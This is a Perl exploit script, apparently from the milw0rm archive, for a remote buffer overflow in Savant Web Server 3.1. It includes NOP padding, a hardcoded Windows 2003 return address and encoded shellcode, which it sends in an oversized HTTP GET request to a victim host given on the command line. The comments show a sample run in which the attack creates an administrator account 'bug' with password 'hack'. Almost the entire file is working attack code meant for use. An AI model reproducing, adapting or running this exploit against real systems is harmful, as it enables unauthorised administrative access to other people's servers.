#!/usr/bin/perl
#
#D:\Documents and Settings\Administrator\Desktop\explo da uppare\prova>savant.pl
#-h 127.0.0.1
#
#-=[     Savant Web Server 3.1 Remote Buffer Overflow Exploit            ]=-
#-=[                                                                     ]=-
#-=[ Coded by CorryL                            info:www.x0n3-h4ck.org   ]=-
#
#[+] Connect to 127.0.0.1
#[+] Using 00b7ead8 // Ret For Win2003
#[+] Sending Payload 258 byte
#[+] Creating Administrator User: User 'bug' Password 'hack'
#
#D:\Documents and Settings\Administrator\Desktop\explo da uppare\prova>net users
#
#Account utente per \\SERVER
# Added above info from http://x0n3-h4ck.org /str0ke                             #
##################################################################################
#Savant Web Server 3.1 Remote Buffer Overflow Exploit                            #        
#                                                                                #
#This is exploit sending the 253 evil byte                                       #   
#the eip register the overwrite on 254 > 258 byte                                #
#exploit succefull created the Administrator User                                #
#in the server victim                                                            #
#Tested on win2003 server using ret 00b7ead8                                     #
#										 #
#D:\Documents and Settings\Administrator\Desktop\explo da uppare\prova>net users #
#Account utente per \\SERVER                                                     #
#------------------------------------------------------------------------------- #
#__vmware_user__          Administrator            ASPNET                        #
#bug                      Guest                    SUPPORT_388945a0              #
#Esecuzione comando riuscita.                                                    # 
#D:\Documents and Settings\Administrator\Desktop\explo da uppare\prova>          #
# 										 #
#thanks to Mati Aharoni for discovered the bug     			         #  
#  	                                                  info: www.x0n3-h4ck.org#
##################################################################################

use IO::Socket; 
use Getopt::Std; getopts('h:', \%args);


if (defined($args{'h'})) { $host = $args{'h'}; }

print STDERR "\n-=[     Savant Web Server 3.1 Remote Buffer Overflow Exploit            ]=-\n";
print STDERR "-=[                                                                     ]=-\n";
print STDERR "-=[ Coded by CorryL                            info:www.x0n3-h4ck.org   ]=-\n\n";

if (!defined($host)) {
Usage();
}

$nop = "\x90"x13;
$ret= "\xd8\xea\xb7\x00";
my $shellcode =
"\x2b\xc9\x83\xe9\xca\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x09".
"\xb1\xc5\xbd\x83\xeb\xfc\xe2\xf4\xf5\x59\x83\xbd\x09\xb1\x4e\xf8".
"\x35\x3a\xb9\xb8\x71\xb0\x2a\x36\x46\xa9\x4e\xe2\x29\xb0\x2e\x5e".
"\x27\xf8\x4e\x89\x82\xb0\x2b\x8c\xc9\x28\x69\x39\xc9\xc5\xc2\x7c".
"\xc3\xbc\xc4\x7f\xe2\x45\xfe\xe9\x2d\xb5\xb0\x5e\x82\xee\xe1\xbc".
"\xe2\xd7\x4e\xb1\x42\x3a\x9a\xa1\x08\x5a\x4e\xa1\x82\xb0\x2e\x34".
"\x55\x95\xc1\x7e\x38\x71\xa1\x36\x49\x81\x40\x7d\x71\xbe\x4e\xfd".
"\x05\x3a\xb5\xa1\xa4\x3a\xad\xb5\xe0\xba\xc5\xbd\x09\x3a\x85\x89".
"\x0c\xcd\xc5\xbd\x09\x3a\xad\x81\x56\x80\x33\xdd\x5f\x5a\xc8\xd5".
"\xf9\x3b\xc1\xe2\x61\x29\x3b\x37\x07\xe6\x3a\x5a\xe1\x5f\x3a\x42".
"\xf6\xd2\xa8\xd9\x27\xd4\xbd\xd8\x29\x9e\xa6\x9d\x67\xd4\xb1\x9d".
"\x7c\xc2\xa0\xcf\x29\xd3\xb0\xda\x29\xd9\xa4\xde\x62\x91\xea\xfc".
"\x4d\xf5\xe5\x9b\x2f\x91\xab\xd8\x7d\x91\xa9\xd2\x6a\xd0\xa9\xda".
"\x7b\xde\xb0\xcd\x29\xf0\xa1\xd0\x60\xdf\xac\xce\x7d\xc3\xa4\xc9".
"\x66\xc3\xb6\x9d\x6b\xc4\xa2\x9d\x26\xf0\x81\xf9\x09\xb1\xc5\xbd";

print "[+] Connect to $host\n";

$socket = new IO::Socket::INET (PeerAddr => "$host",
                                PeerPort => 80,
                                Proto => 'tcp');
                                die unless $socket;
                                print "[+] Using 00b7ead8 // Ret For Win2003\n"; 
                                $buff = $nop.$shellcode.$ret;
                                print "[+] Sending Payload 258 byte\n";
                                $data = "GET /$buff \r\n\r\n";
         
                                send ($socket,$data,0);
print "[+] Creating Administrator User: User 'bug' Password 'hack'\n";
close;

sub Usage {
print STDERR "Usage:
-h Victim host.\n\n";
exit;
}

# milw0rm.com [2005-02-04]